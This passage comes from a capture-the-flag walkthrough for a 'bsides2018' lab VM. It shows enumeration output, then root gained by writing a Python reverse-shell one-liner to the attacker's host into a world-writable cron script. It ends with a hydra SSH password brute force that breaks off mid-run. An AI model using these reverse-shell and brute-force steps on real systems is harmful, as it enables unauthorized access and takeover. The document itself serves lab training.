-rw-r--r--  1 www-data www-data 3.8K Feb 19  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wordpress:
total 52K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  27K Mar 16  2016 plugin.js
-rw-r--r--  1 www-data www-data  14K Mar 16  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpautoresize:
total 20K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 5.9K Apr  8  2015 plugin.js
-rw-r--r--  1 www-data www-data 2.4K Apr  8  2015 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpdialogs:
total 16K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 2.4K Apr  8  2014 plugin.js
-rw-r--r--  1 www-data www-data 1.4K Apr  8  2014 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpeditimage:
total 56K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  29K Mar 13  2016 plugin.js
-rw-r--r--  1 www-data www-data  14K Mar 13  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpembed:
total 16K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  444 Oct 26  2015 plugin.js
-rw-r--r--  1 www-data www-data  280 Oct 26  2015 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpemoji:
total 16K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 3.5K Mar  9  2016 plugin.js
-rw-r--r--  1 www-data www-data 1.6K Mar  9  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpgallery:
total 16K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 3.2K Nov  7  2015 plugin.js
-rw-r--r--  1 www-data www-data 1.7K Nov  7  2015 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wplink:
total 32K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  15K Apr 11  2016 plugin.js
-rw-r--r--  1 www-data www-data 7.6K Apr 11  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wptextpattern:
total 20K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 6.8K Mar 16  2016 plugin.js
-rw-r--r--  1 www-data www-data 3.0K Mar 16  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpview:
total 44K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  21K Nov 10  2015 plugin.js
-rw-r--r--  1 www-data www-data 8.5K Nov 10  2015 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/skins:
total 16K
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 7 www-data www-data 4.0K Apr 12  2016 ..
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 lightgray
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 wordpress

/var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray:
total 92K
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 2.7K Mar  1  2016 content.inline.min.css
-rw-r--r-- 1 www-data www-data 3.1K Mar  1  2016 content.min.css
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 fonts
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 img
-rw-r--r-- 1 www-data www-data  31K Mar  1  2016 skin.ie7.min.css
-rw-r--r-- 1 www-data www-data  33K Mar  2  2016 skin.min.css

/var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts:
total 312K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data   67 Dec 28  2013 readme.md
-rw-r--r-- 1 www-data www-data 9.3K Jan 19  2016 tinymce-small.eot
-rw-r--r-- 1 www-data www-data  40K Jan 19  2016 tinymce-small.json
-rw-r--r-- 1 www-data www-data  25K Jan 19  2016 tinymce-small.svg
-rw-r--r-- 1 www-data www-data 9.1K Jan 19  2016 tinymce-small.ttf
-rw-r--r-- 1 www-data www-data 9.2K Jan 19  2016 tinymce-small.woff
-rw-r--r-- 1 www-data www-data  17K Mar  1  2016 tinymce.eot
-rw-r--r-- 1 www-data www-data  86K Mar  1  2016 tinymce.json
-rw-r--r-- 1 www-data www-data  45K Mar  1  2016 tinymce.svg
-rw-r--r-- 1 www-data www-data  17K Mar  1  2016 tinymce.ttf
-rw-r--r-- 1 www-data www-data  17K Mar  1  2016 tinymce.woff

/var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/img:
total 24K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data   53 Dec 28  2013 anchor.gif
-rw-r--r-- 1 www-data www-data 2.6K Dec 28  2013 loader.gif
-rw-r--r-- 1 www-data www-data  152 Dec 28  2013 object.gif
-rw-r--r-- 1 www-data www-data   43 Dec 28  2013 trans.gif

/var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress:
total 24K
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 ..
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 images
-rw-r--r-- 1 www-data www-data 9.0K Mar 13  2016 wp-content.css

/var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images:
total 64K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  412 Feb 13  2014 audio.png
-rw-r--r-- 1 www-data www-data  368 Dec  1  2014 dashicon-edit.png
-rw-r--r-- 1 www-data www-data  339 Dec  1  2014 dashicon-no.png
-rw-r--r-- 1 www-data www-data 8.0K Nov 25  2014 embedded.png
-rw-r--r-- 1 www-data www-data  447 Feb 13  2014 gallery-2x.png
-rw-r--r-- 1 www-data www-data  379 Feb 13  2014 gallery.png
-rw-r--r-- 1 www-data www-data  603 Oct 28  2014 more-2x.png
-rw-r--r-- 1 www-data www-data  414 Oct 28  2014 more.png
-rw-r--r-- 1 www-data www-data  835 Apr  3  2014 pagebreak-2x.png
-rw-r--r-- 1 www-data www-data 1.2K Oct 28  2014 pagebreak.png
-rw-r--r-- 1 www-data www-data  440 Mar  4  2014 playlist-audio.png
-rw-r--r-- 1 www-data www-data  290 Mar  4  2014 playlist-video.png
-rw-r--r-- 1 www-data www-data  363 Feb 13  2014 video.png

/var/www/backup_wordpress/wp-includes/js/tinymce/themes:
total 12K
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 7 www-data www-data 4.0K Apr 12  2016 ..
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 modern

/var/www/backup_wordpress/wp-includes/js/tinymce/themes/modern:
total 44K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  21K Mar 15  2016 theme.js
-rw-r--r-- 1 www-data www-data 9.1K Mar 15  2016 theme.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/utils:
total 32K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 7 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 2.0K Jun 30  2015 editable_selects.js
-rw-r--r-- 1 www-data www-data 5.7K Jun 30  2015 form_utils.js
-rw-r--r-- 1 www-data www-data 3.9K Jun 30  2015 mctabs.js
-rw-r--r-- 1 www-data www-data 5.8K Jun 30  2015 validate.js

/var/www/backup_wordpress/wp-includes/pomo:
total 64K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 2.9K Nov 19  2015 entry.php
-rw-r--r--  1 www-data www-data 8.0K Nov 19  2015 mo.php
-rw-r--r--  1 www-data www-data  13K Nov 19  2015 po.php
-rw-r--r--  1 www-data www-data 5.9K Nov 19  2015 streams.php
-rw-r--r--  1 www-data www-data 8.6K Nov 19  2015 translations.php

/var/www/backup_wordpress/wp-includes/random_compat:
total 76K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 5.6K Mar  8  2016 byte_safe_strings.php
-rw-r--r--  1 www-data www-data 2.5K Mar  8  2016 cast_to_int.php
-rw-r--r--  1 www-data www-data 1.5K Oct 22  2015 error_polyfill.php
-rw-r--r--  1 www-data www-data 7.6K Mar  8  2016 random.php
-rw-r--r--  1 www-data www-data 2.5K Mar  8  2016 random_bytes_com_dotnet.php
-rw-r--r--  1 www-data www-data 4.5K Mar  8  2016 random_bytes_dev_urandom.php
-rw-r--r--  1 www-data www-data 2.6K Mar  8  2016 random_bytes_libsodium.php
-rw-r--r--  1 www-data www-data 2.6K Mar  8  2016 random_bytes_libsodium_legacy.php
-rw-r--r--  1 www-data www-data 2.3K Mar  8  2016 random_bytes_mcrypt.php
-rw-r--r--  1 www-data www-data 2.6K Mar  8  2016 random_bytes_openssl.php
-rw-r--r--  1 www-data www-data 5.6K Mar  8  2016 random_int.php

/var/www/backup_wordpress/wp-includes/rest-api:
total 84K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  23K Mar 16  2016 class-wp-rest-request.php
-rw-r--r--  1 www-data www-data 7.5K Mar 16  2016 class-wp-rest-response.php
-rw-r--r--  1 www-data www-data  35K Apr  6  2016 class-wp-rest-server.php

/var/www/backup_wordpress/wp-includes/theme-compat:
total 52K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 2.1K Feb 20  2016 comments.php
-rw-r--r--  1 www-data www-data  970 Mar 28  2016 embed-404.php
-rw-r--r--  1 www-data www-data 3.1K Mar 28  2016 embed-content.php
-rw-r--r--  1 www-data www-data  479 Mar 28  2016 embed.php
-rw-r--r--  1 www-data www-data  437 Mar 28  2016 footer-embed.php
-rw-r--r--  1 www-data www-data 1.1K Feb 20  2016 footer.php
-rw-r--r--  1 www-data www-data  703 Mar 28  2016 header-embed.php
-rw-r--r--  1 www-data www-data 1.9K Oct 30  2015 header.php
-rw-r--r--  1 www-data www-data 4.0K Feb 20  2016 sidebar.php

/var/www/backup_wordpress/wp-includes/widgets:
total 104K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 5.0K Mar 21  2016 class-wp-nav-menu-widget.php
-rw-r--r--  1 www-data www-data 5.1K Mar 21  2016 class-wp-widget-archives.php
-rw-r--r--  1 www-data www-data 2.9K Mar 21  2016 class-wp-widget-calendar.php
-rw-r--r--  1 www-data www-data 5.6K Mar 21  2016 class-wp-widget-categories.php
-rw-r--r--  1 www-data www-data 6.9K Mar 21  2016 class-wp-widget-links.php
-rw-r--r--  1 www-data www-data 3.5K Mar 21  2016 class-wp-widget-meta.php
-rw-r--r--  1 www-data www-data 4.7K Mar 21  2016 class-wp-widget-pages.php
-rw-r--r--  1 www-data www-data 5.7K Mar 21  2016 class-wp-widget-recent-comments.php
-rw-r--r--  1 www-data www-data 4.8K Mar 21  2016 class-wp-widget-recent-posts.php
-rw-r--r--  1 www-data www-data 3.7K Mar 21  2016 class-wp-widget-rss.php
-rw-r--r--  1 www-data www-data 2.6K Mar 21  2016 class-wp-widget-search.php
-rw-r--r--  1 www-data www-data 5.0K Mar 21  2016 class-wp-widget-tag-cloud.php
-rw-r--r--  1 www-data www-data 4.1K Mar 21  2016 class-wp-widget-text.php


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl


[-] Installed compilers:
ii  gcc                                        4:4.6.3-1ubuntu5                    GNU C compiler
ii  gcc-4.6                                    4.6.3-1ubuntu5                      GNU C compiler
ii  libprotoc7                                 2.4.1-1ubuntu2                      protocol buffers compiler library
ii  protobuf-compiler                          2.4.1-1ubuntu2                      compiler for protocol buffer definition files


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1990 Mar  4 16:13 /etc/passwd
-rw-r--r-- 1 root root 969 Mar  3 16:57 /etc/group
-rw-r--r-- 1 root root 665 Feb  4  2014 /etc/profile
-rw-r----- 1 root shadow 1616 Mar  4 18:47 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 67720 Mar 29  2012 /bin/umount
-rwsr-xr-x 1 root root 26252 Mar  2  2012 /bin/fusermount
-rwsr-xr-x 1 root root 39116 Nov  8  2011 /bin/ping6
-rwsr-xr-x 1 root root 34740 Nov  8  2011 /bin/ping
-rwsr-xr-x 1 root root 88760 Mar 29  2012 /bin/mount
-rwsr-xr-x 1 root root 31116 Sep 12  2012 /bin/su
-rwsr-xr-x 1 root root 9760 Sep 11  2013 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 316824 Jun 13  2013 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 248056 Aug 11  2016 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5564 Dec 13  2011 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 9728 Sep 30  2013 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 13860 Nov  8  2011 /usr/bin/arping
-rwsr-sr-x 1 daemon daemon 42800 Oct 25  2011 /usr/bin/at
-rwsr-xr-x 1 root root 40292 Sep 12  2012 /usr/bin/chfn
-rwsr-xr-x 1 root root 14012 Nov  8  2011 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 69708 Feb 27  2013 /usr/bin/sudo
-rwsr-xr-x 1 root root 56208 Jul 28  2011 /usr/bin/mtr
-rwsr-xr-x 1 root root 57956 Sep 12  2012 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 41284 Sep 12  2012 /usr/bin/passwd
-rwsr-xr-x 1 root root 30896 Sep 12  2012 /usr/bin/newgrp
-rwsr-xr-x 1 root lpadmin 9768 May 13  2013 /usr/bin/lppasswd
-rwsr-xr-x 1 root root 69708 Feb 27  2013 /usr/bin/sudoedit
-rwsr-xr-x 1 root root 31748 Sep 12  2012 /usr/bin/chsh
-rwsr-sr-x 1 root root 9524 Jan  6  2014 /usr/bin/X
-rwsr-xr-x 1 root root 18104 Sep 11  2013 /usr/bin/pkexec
-rwsr-sr-x 1 libuuid libuuid 17976 Mar 29  2012 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 273272 Feb  4  2011 /usr/sbin/pppd


[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 248056 Aug 11  2016 /usr/lib/openssh/ssh-keysign


[-] GUID files:
-rwxr-sr-x 1 root shadow 30364 Feb  8  2012 /sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 13996 Apr 16  2012 /usr/lib/libvte-2.90-9/gnome-pty-helper
-rwxr-sr-x 1 root mail 13844 Jul 30  2013 /usr/lib/evolution/camel-lock-helper-1.2
-rwxr-sr-x 1 root utmp 5364 Apr 30  2011 /usr/lib/utempter/utempter
-rwxr-sr-x 1 root mail 9684 Oct 18  2011 /usr/bin/mail-unlock
-rwxr-sr-x 1 root tty 18036 Mar 29  2012 /usr/bin/wall
-rwxr-sr-x 1 root mail 13892 Jun 27  2013 /usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 18120 Sep 12  2012 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 128416 Aug 11  2016 /usr/bin/ssh-agent
-rwsr-sr-x 1 daemon daemon 42800 Oct 25  2011 /usr/bin/at
-rwxr-sr-x 1 root mail 9684 Oct 18  2011 /usr/bin/mail-lock
-rwxr-sr-x 1 root mlocate 34432 Aug 17  2011 /usr/bin/mlocate
-rwxr-sr-x 1 root mail 9684 Oct 18  2011 /usr/bin/mail-touchlock
-rwxr-sr-x 1 root tty 9728 Mar 31  2012 /usr/bin/bsd-write
-rwsr-sr-x 1 root root 9524 Jan  6  2014 /usr/bin/X
-rwxr-sr-x 1 root crontab 34776 Jun 19  2012 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 45284 Sep 12  2012 /usr/bin/chage
-rwxr-sr-x 1 root games 126100 Jan 15  2013 /usr/games/gnomine
-rwxr-sr-x 1 root games 146584 Jan 15  2013 /usr/games/mahjongg
-rwsr-sr-x 1 libuuid libuuid 17976 Mar 29  2012 /usr/sbin/uuidd


[+] Possibly interesting GUID files:
-rwxr-sr-x 1 root ssh 128416 Aug 11  2016 /usr/bin/ssh-agent


[-] World-writable files (excluding /proc and /sys):
-rwxrwxrwx 1 root root 64 Mar  3 16:13 /usr/local/bin/cleanup


[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
proc            /proc           proc    nodev,noexec,nosuid 0       0
# / was on /dev/sda1 during installation
UUID=1468ae94-d6c0-4c19-8ac2-19848ff443ee /               ext4    errors=remount-ro 0       1
# swap was on /dev/sda5 during installation
UUID=4de0828a-4c9d-459d-b4ef-814005468dea none            swap    sw              0       0


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 1309 Apr 18  2012 /etc/kerneloops.conf
-rw-r--r-- 1 root root 604 Oct 19  2011 /etc/deluser.conf
-rw-r--r-- 1 root root 112 Jun 22  2007 /etc/apg.conf
-rw-r--r-- 1 root root 956 Mar 30  2012 /etc/mke2fs.conf
-rw-r--r-- 1 root root 2083 Dec  5  2011 /etc/sysctl.conf
-rw-r--r-- 1 root root 2064 Nov 23  2006 /etc/netscsid.conf
-rw-r--r-- 1 root root 34 Feb  4  2014 /etc/ld.so.conf
-rw-r--r-- 1 root root 552 Feb  8  2012 /etc/pam.conf
-rw-r--r-- 1 root root 1260 May  2  2011 /etc/ucf.conf
-rw-r--r-- 1 root root 6961 Feb  4  2014 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 15752 Jul 25  2009 /etc/ltrace.conf
-rw-r--r-- 1 root root 91 Mar  3 11:09 /etc/kernel-img.conf
-rw-r--r-- 1 root root 2969 Mar 15  2012 /etc/debconf.conf
-rw-r--r-- 1 root root 624 May  8  2013 /etc/mtools.conf
-rw-r--r-- 1 root root 7649 Feb  4  2014 /etc/pnm2ppa.conf
-rw-r--r-- 1 root root 2981 Feb  4  2014 /etc/adduser.conf
-rw-r--r-- 1 root root 599 Oct  4  2011 /etc/logrotate.conf
-rw-r--r-- 1 root root 5570 Mar  3 16:50 /etc/vsftpd.conf
-rw-r----- 1 root fuse 216 Oct 18  2011 /etc/fuse.conf
-rw-r--r-- 1 root root 19925 Apr 10  2012 /etc/brltty.conf
-rw-r--r-- 1 root root 513 Feb  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 839 Apr  9  2012 /etc/insserv.conf
-rw-r--r-- 1 root root 699 Oct 23  2012 /etc/colord.conf
-rw-r--r-- 1 root root 572 Mar  7  2012 /etc/usb_modeswitch.conf
-rw-r--r-- 1 root root 1343 Jan  9  2007 /etc/wodim.conf
-rw-r--r-- 1 root root 4728 May  2  2012 /etc/hdparm.conf
-rw-r--r-- 1 root root 10333 Feb 21  2012 /etc/sensors3.conf
-rw-r--r-- 1 root root 3342 Mar  3 12:35 /etc/gai.conf
-rw-r--r-- 1 root root 350 Mar  3 11:08 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 326 Aug 17  2011 /etc/updatedb.conf
-rw-r--r-- 1 root root 1263 Mar 30  2012 /etc/rsyslog.conf
-rw-r--r-- 1 root root 321 Mar 29  2012 /etc/blkid.conf
-rw-r--r-- 1 root root 92 Apr 19  2012 /etc/host.conf


[-] Location and contents (if accessible) of .bash_history file(s):
/home/abatchy/.bash_history


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Feb  4  2014 .
drwxr-xr-x 15 root root 4096 Mar  7 12:17 ..


### SCAN COMPLETE ####################################
www-data@bsides2018:/$
```

###### Gaining root

![](images/10.png)

![](images/11.png)

```sh
www-data@bsides2018:/$ cat /usr/local/bin/cleanup
#!/bin/sh

rm -rf /var/log/apache2/*	# Clean those damn logs!!

www-data@bsides2018:/$
```

```python
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.150.19",8001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

```sh
www-data@bsides2018:/$ cat /usr/local/bin/cleanup
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.150.19",8001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
www-data@bsides2018:/$
```

```sh
root@kali:~/bsides# nc -nlvp 8001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8001
Ncat: Listening on 0.0.0.0:8001
Ncat: Connection from 192.168.150.18.
Ncat: Connection from 192.168.150.18:47946.
root@bsides2018:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bsides2018:~# ls
ls
flag.txt
root@bsides2018:~# cat flag.txt
cat flag.txt
Congratulations!

If you can read this, that means you were able to obtain root permissions on this VM.
You should be proud!

There are multiple ways to gain access remotely, as well as for privilege escalation.
Did you find them all?

@abatchy17

root@bsides2018:~#
```

###### SSH brute force anne

```sh
root@kali:~/bsides# hydra
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]

Options:
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -U        service module usage details
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
v3.0. The newest version is always available at http://www.thc.org/thc-hydra
Don't use in military or secret service organizations, or for illegal purposes.

Example:  hydra -l user -P passlist.txt ftp://192.168.0.1
root@kali:~/bsides#
```

```sh
root@kali:~/bsides# hydra -l anne -P 10k-most-common.txt 192.168.150.18 ssh -t 4 -V
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-07-02 17:44:27
[DATA] max 4 tasks per 1 server, overall 4 tasks, 10000 login tries (l:1/p:10000), ~2500 tries per task
[DATA] attacking ssh://192.168.150.18:22/
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "password" - 1 of 10000 [child 0] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "123456" - 2 of 10000 [child 1] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "12345678" - 3 of 10000 [child 2] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "1234" - 4 of 10000 [child 3] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "qwerty" - 5 of 10000 [child 0] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "12345" - 6 of 10000 [child 1] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "dragon" - 7 of 10000 [child 2] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "pussy" - 8 of 10000 [child 3] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "baseball" - 9 of 10000 [child 0] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "football" - 10 of 10000 [child 2] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "letmein" - 11 of 10000 [child 1] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "monkey" - 12 of 10000 [child 3] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "696969" - 13 of 10000 [child 0] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "abc123" - 14 of 10000 [child 2] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "mustang" - 15 of 10000 [child 1] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "michael" - 16 of 10000 [child 3] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "shadow" - 17 of 10000 [child 0] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "master" - 18 of 10000 [child 1] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "jennifer" - 19 of 10000 [child 2] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "111111" - 20 of 10000 [child 3] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "2000" - 21 of 10000 [child 0] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "jordan" - 22 of 10000 [child 1] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "superman" - 23 of 10000 [child 2] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "harley" - 24 of 10000 [child 3] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "1234567" - 25 of 10000 [child 0] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "fuckme" - 26 of 10000 [child 1] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "hunter" - 27 of 10000 [child 3] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "fuckyou" - 28 of 10000 [child 2] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "trustno1" - 29 of 10000 [child 0] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "ranger" - 30 of 10000 [child 1] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "buster" - 31 of 10000 [child 3] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "thomas" - 32 of 10000 [child 2] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "tigger" - 33 of 10000 [child 0] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "robert" - 34 of 10000 [child 1] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "soccer" - 35 of 10000 [child 3] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "fuck" - 36 of 10000 [child 2] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "batman" - 37 of 10000 [child 0] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "test" - 38 of 10000 [child 1] (0/0)
[ATTEMPT] target 192.168.150.18 - login "anne" - pass "pass" - 39 of 10000 [child 3] (0/0)
